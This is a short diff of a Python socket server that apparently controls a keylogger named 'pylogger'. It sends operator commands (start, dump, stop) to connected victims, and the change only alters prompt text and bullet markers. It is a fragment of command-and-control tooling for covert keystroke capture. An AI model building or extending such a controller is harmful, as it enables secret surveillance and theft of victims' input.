@@ -18,12 +18,12 @@ while 1:
         c, addr = s.accept()
         print('[+]Connection from',addr)
         while True:   
-            cmd = input('shell@%s# ' %addr[0])
+            cmd = input('pylogger@%s# ' %addr[0])
             if cmd not in commands:
                 print('[*]Available commands:')
-                print('[+] -> start')
-                print('[+] -> dump')
-                print('[+] -> stop')
+                print('[*] -> start')
+                print('[*] -> dump')
+                print('[*] -> stop')
             else:
                 c.send(str.encode(cmd))
 
